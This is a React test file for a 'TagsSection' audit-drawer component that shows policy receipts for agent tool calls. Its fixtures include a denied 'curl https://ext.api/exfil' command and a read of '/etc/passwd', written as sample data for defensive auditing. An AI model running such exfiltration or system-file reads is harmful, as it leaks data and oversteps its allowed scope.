// Wave C — TagsSection drawer-header tests.
//
// Asserts:
//   - With null tags the section returns null (drawer falls through to
//     tabs unchanged).
//   - When tags are populated, the section renders display_summary
//     prominently, the category pill, scope_kind/scope_value pills,
//     and target_resources.
//   - When decision is "deny" the category pill is forced to red (R4
//     Rule 01). The redundant inline <Pill tone="danger">deny</Pill>
//     was removed in MR !90 fix-pass — the brief's chip-row spec lists
//     no separate DENY chip; the forced-red CategoryPill already
//     encodes the deny signal.
//   - semantic_args renders as a collapsible key/value table; closed
//     by default; toggling expands.

import { render, screen, fireEvent } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { TagsSection } from "~/components/audit/TagsSection";
import type { ReceiptDetail } from "~/hooks/useReceiptDetail";

function makeData(opts: {
  tags?: Record<string, unknown> | null;
  decision?: "allow" | "deny" | null;
}): ReceiptDetail {
  return {
    run_id: "run_01HZQ",
    signed_predicate: {
      run_id: "run_01HZQ",
      session_id: null,
      turn_id: null,
      event_kind: "tool_call",
      machine_identity: null,
      principal: null,
      tenant_id: null,
      policy_canonical_hash: null,
      payload_hash: null,
      payload_uri: null,
      correlation_id: null,
      signer_kms_key_id: null,
      signer_key_version: null,
      timestamp: "2026-04-29T12:00:00.000Z",
    },
    outer_container: {
      verification_level: null,
      tier_completeness_advisory: null,
      session_chain_epoch: null,
      session_chain_root: null,
      policy_decision: opts.decision ?? "allow",
      outcome: null,
      upstream_status_code: null,
      commit_retry_exhausted: null,
      tags: opts.tags ?? null,
    },
  };
}

describe("TagsSection", () => {
  it("returns null when tags are absent (drawer falls through to tabs)", () => {
    const { container } = render(<TagsSection data={makeData({ tags: null })} />);
    expect(container.firstChild).toBeNull();
  });

  it("returns null when tags are empty {} (no fields populated)", () => {
    const { container } = render(<TagsSection data={makeData({ tags: {} })} />);
    expect(container.firstChild).toBeNull();
  });

  it("renders display_summary as the lead and the category pill", () => {
    render(
      <TagsSection
        data={makeData({
          tags: {
            display_summary: "Bash: git status",
            category: "subprocess_exec",
          },
        })}
      />,
    );
    expect(screen.getByTestId("tags-summary")).toHaveTextContent("Bash: git status");
    expect(screen.getByTestId("category-pill")).toHaveTextContent("subprocess_exec");
  });

  it("forces the category pill RED when policy_decision is deny", () => {
    render(
      <TagsSection
        data={makeData({
          decision: "deny",
          tags: {
            display_summary: "Bash: curl https://ext.api/exfil",
            category: "subprocess_exec",
          },
        })}
      />,
    );
    const pill = screen.getByTestId("category-pill");
    expect(pill).toHaveTextContent("policy_denied");
    expect(pill.className).toMatch(/text-r5e-chart-denied/);
    // The forced-red CategoryPill is the only deny signal in the chip row
    // (the redundant inline <Pill tone="danger">deny</Pill> was removed in
    // MR !90 fix-pass — see brief 03-receipt-drawer.md chip-row spec).
    expect(screen.queryByTestId("tags-pill-deny")).not.toBeInTheDocument();
  });

  it("renders scope_kind and scope_value pills when present", () => {
    render(
      <TagsSection
        data={makeData({
          tags: {
            display_summary: "Read: /etc/passwd",
            category: "file_read",
            scope_kind: "file_outside_workdir",
            scope_value: "/etc/passwd",
          },
        })}
      />,
    );
    expect(screen.getByTestId("tags-pill-scope-kind")).toHaveTextContent("file_outside_workdir");
    expect(screen.getByTestId("tags-pill-scope-value")).toHaveTextContent("/etc/passwd");
  });

  it("renders target_resources as individual pills", () => {
    render(
      <TagsSection
        data={makeData({
          tags: {
            display_summary: "MCP[datadog]: query_metrics",
            category: "mcp_tool_call",
            target_resources: ["datadog", "metrics.requests.count"],
          },
        })}
      />,
    );
    const pills = screen.getAllByTestId("tags-pill-target");
    expect(pills).toHaveLength(2);
    expect(pills[0]).toHaveTextContent("datadog");
    expect(pills[1]).toHaveTextContent("metrics.requests.count");
  });

  it("renders semantic_args as a collapsible table — closed by default", () => {
    render(
      <TagsSection
        data={makeData({
          tags: {
            display_summary: "Bash: curl https://ext.api/exfil",
            category: "subprocess_exec",
            semantic_args: {
              verb: "curl",
              url: "https://ext.api/exfil",
              outside_workdir: true,
            },
          },
        })}
      />,
    );
    const toggle = screen.getByTestId("tags-semantic-args-toggle");
    expect(toggle).toHaveAttribute("aria-expanded", "false");
    expect(toggle).toHaveTextContent("semantic_args (3)");
    // Body keys not yet visible
    expect(screen.queryByText("verb")).not.toBeInTheDocument();
    fireEvent.click(toggle);
    expect(toggle).toHaveAttribute("aria-expanded", "true");
    expect(screen.getByText("verb")).toBeInTheDocument();
    expect(screen.getByText("curl")).toBeInTheDocument();
    expect(screen.getByText("outside_workdir")).toBeInTheDocument();
  });

  it("renders the typed-properties row when tool_kind/verb/argument_body are set (#64)", () => {
    render(
      <TagsSection
        data={makeData({
          tags: {
            category: "subprocess_exec",
            tool_kind: "bash",
            verb: "git",
            argument_body: "status",
          },
        })}
      />,
    );
    const row = screen.getByTestId("tags-typed-properties");
    expect(row).toBeInTheDocument();
    expect(screen.getByTestId("tags-typed-tool-kind")).toHaveTextContent("bash");
    expect(screen.getByTestId("tags-typed-verb")).toHaveTextContent("git");
    expect(screen.getByTestId("tags-typed-argument-body")).toHaveTextContent("status");
  });

  it("hides the typed-properties row when none of the typed fields are set", () => {
    render(
      <TagsSection
        data={makeData({
          tags: {
            category: "unknown",
            display_summary: "something",
          },
        })}
      />,
    );
    expect(screen.queryByTestId("tags-typed-properties")).not.toBeInTheDocument();
  });
});
